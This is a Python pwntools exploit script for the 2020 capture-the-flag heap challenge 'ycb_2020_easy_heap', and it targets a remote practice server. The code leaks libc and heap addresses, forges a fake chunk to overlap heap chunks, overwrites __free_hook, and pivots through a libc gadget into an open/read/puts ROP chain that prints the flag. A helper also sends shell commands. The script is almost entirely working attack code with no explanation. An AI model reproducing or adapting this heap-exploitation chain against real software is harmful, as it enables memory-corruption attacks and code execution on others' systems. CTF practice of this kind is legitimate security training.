# -*- encoding: utf-8 -*-
import sys 
import os 
from pwn import * 
# context.update( os = 'linux', arch = 'amd64',timeout = 1)
binary = './ycb_2020_easy_heap'
os.system('chmod +x %s'%binary)
elf = ELF(binary)
libc = elf.libc
# libc = ELF('')
context.binary = binary
DEBUG = 0
if DEBUG:
    libc = elf.libc
    context.log_level = 'debug' 
    p = process(binary)
    # p = process(['qemu-arm', binary])
    # p = process(['qemu-arm', binary,'-g','1234'])
    # p = process(['qemu-aarch64','-L','','-g','1234',binary])
else:
    host = 'node4.buuoj.cn'
    port = '27870'
    p = remote(host,port)

l64 = lambda            : u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00'))
l32 = lambda            : u32(p.recvuntil('\xf7')[-4:].ljust(4,'\x00'))
uu64= lambda a         : u64(p.recv(a).ljust(8,'\x00'))
sla = lambda a,b        : p.sendlineafter(str(a),str(b))
sa  = lambda a,b        : p.sendafter(str(a),str(b))
lg  = lambda name,data  : p.success(name + ': 0x%x' % data)
se  = lambda payload    : p.send(payload)
rl  = lambda            : p.recv()
sl  = lambda payload    : p.sendline(payload)
ru  = lambda a          : p.recvuntil(str(a))
rint= lambda x = 12     : int( p.recv(x) , 16)

def getShell():
    sl('exec 1>&0')
    sl('echo shell')
    ru('shell')
    p.success('Get Shell')
    sl('cat flag')
    ru('flag')
    flag = rl()
    return ('flag' + flag)

def dbg( b = null):
    if (b == null):
        gdb.attach(p)
        pause()
    else:
        gdb.attach(p,'b %s'%b)

def exhaust( pwn ):
    global p
    i = 0
    while 1 :
        try:
            i+=1
            pwn()
        except:
            lg('times ======== > ',i)
            p.close()
            if (DEBUG):
                p = process(binary)
            else :
                p = remote(host,port)

def one_gadget(filename):
    log.success('Leak One_Gadgets...')
    one_ggs = str(subprocess.check_output(['one_gadget','--raw', '-f',filename])).split(' ')
    return list(map(int,one_ggs))

def cmd(num):
    sla('Choice:',num)

def add(size):
    cmd(1)
    sla('Size:' , size)

def edit(idx , content):
    cmd(2)
    sla('Index:' , idx)
    sa('Content:' , content)

def show(idx):
    cmd(4)
    sla('Index:' , idx)

def delete(idx):
    cmd(3)
    sla('Index:' , idx)

# one_gad = one_gadget(libc.path)

def attack():
    add(0x418) #0
    add(0x88) #1
    delete(0)
    add(0x418) #0
    show(0)
    __malloc_hook = l64() - 0x70
    libc.address = __malloc_hook - libc.sym['__malloc_hook']
    system_addr = libc.sym['system']
    __free_hook = libc.sym['__free_hook']
    binsh_addr = libc.search('/bin/sh').next()
    add(0x428) #2
    add(0x418) #3
    delete(0)
    delete(2)

    add(0x4f8) #0
    add(0x428) #2
    show(2)
    ru('tent: ')

    heap_base = u64(p.recv(6).ljust(8,'\x00')) - 0x290
    lg('heap_base' , heap_base)

    fake_chunk = flat(
        0,0xc80 + 0x70,
        heap_base + 0x290 + 0x10 + 0x20 , heap_base + 0x290 + 0x10 + 0x28,
        0,0,
        heap_base + 0x290 + 0x10 , heap_base + 0x290 + 0x10,
        heap_base + 0x290 + 0x10 , heap_base + 0x290 + 0x10
    )
    add(0x418) #4
    add(0x88) #5
    edit(4 , fake_chunk)
    edit(3 , flat(0 , 0 , 0xc80 + 0x70).rjust(0x418 , '\x00'))

    delete(0)
    delete(5)
    delete(1)

    add(0x440) #5
    lg('__free_hook',__free_hook)
    edit(0 , flat('\x00'*0x408 , 0x91 , __free_hook  ))

    # 下面 2.31 标准开启 orw
    magic = 0x157fea + libc.address
    
    # svcudp_reply+26
    # mov    rbp, qword ptr [rdi + 0x48]
    # mov    rax, qword ptr [rbp + 0x18]
    # lea    r13, [rbp + 0x10]
    # mov    dword ptr [rbp + 0x10], 0
    # mov    rdi, r13
    # call   qword ptr [rax + 0x28]
    
    read_addr = libc.sym['read']
    open_addr = libc.sym['open']
    puts_addr = libc.sym['puts']
    leave_ret = libc.search(asm('leave;ret')).next()
    pop_rax_ret = libc.search(asm('pop rax; ret')).next()
    pop_rdi_ret = libc.search(asm('pop rdi; ret')).next()
    pop_rsi_ret = libc.search(asm('pop rsi; ret')).next()
    pop_r13_pop_r15_ret = libc.search(asm('pop r13 ; pop r15 ; ret')).next()
    pop_rdx_pop_rbx_ret = libc.search(asm('pop rdx ; pop rbx ; ret')).next()
    ret = pop_rdi_ret + 1
    
    magic_chain  = flat(
        __free_hook + 0x8, pop_r13_pop_r15_ret , 
        __free_hook + 0x8, __free_hook + 0x10 ,
        pop_rdx_pop_rbx_ret, 0x300 ,
        leave_ret, pop_rsi_ret,
        __free_hook + 0x8 , pop_rdi_ret , 
        0 , read_addr 
    )
    # len magic_chain 0x60
    flag_addr = __free_hook + 0x100 + len(magic_chain) + 8
    chain = flat(
        pop_rdi_ret , flag_addr , pop_rsi_ret , 0 , open_addr,
        pop_rdi_ret , 3 , pop_rsi_ret , flag_addr , pop_rdx_pop_rbx_ret , 0x100 , 0 , read_addr,
        pop_rdi_ret , flag_addr , puts_addr
    ).ljust(0x100,'\x00') + 'flag\x00'
    # len chain 0x80
    
    payload = flat( magic ) + magic_chain
    # dbg('free')
    
    getflag =p64(ret)*0xc + chain
    
    add(0x88)
    add(0x88)
    edit( 5 , payload)
    # dbg('free')
    delete(5)
    se(getflag)
    # dbg()

    ''

attack()
# p.success(getShell())
p.interactive()

'''
@File    :   ycb_2020_easy_heap.py
@Time    :   2021/10/29 20:08:25
@Author  :   Niyah 
'''